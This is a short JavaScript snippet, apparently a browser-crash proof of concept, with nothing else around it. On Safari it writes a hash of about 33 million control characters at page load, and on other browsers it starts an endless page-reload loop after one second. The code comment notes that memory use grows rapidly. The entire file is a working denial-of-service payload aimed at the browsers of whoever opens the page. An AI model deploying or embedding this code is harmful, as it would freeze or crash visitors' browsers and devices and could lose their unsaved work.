// warning: if not using safari the browser's memory usage will grow rapidly
var isSafari = navigator.userAgent.indexOf("Safari") > -1;
if (isSafari) {
    window.onload = () => location.hash = "M" + "\u0001".repeat(2 ** 25) + "m";
} else {
    onbeforeunload = function() {
        localStorage.x = 1
    };
    setTimeout(function() {
        while (1) location.reload(1)
    }, 1000)
}
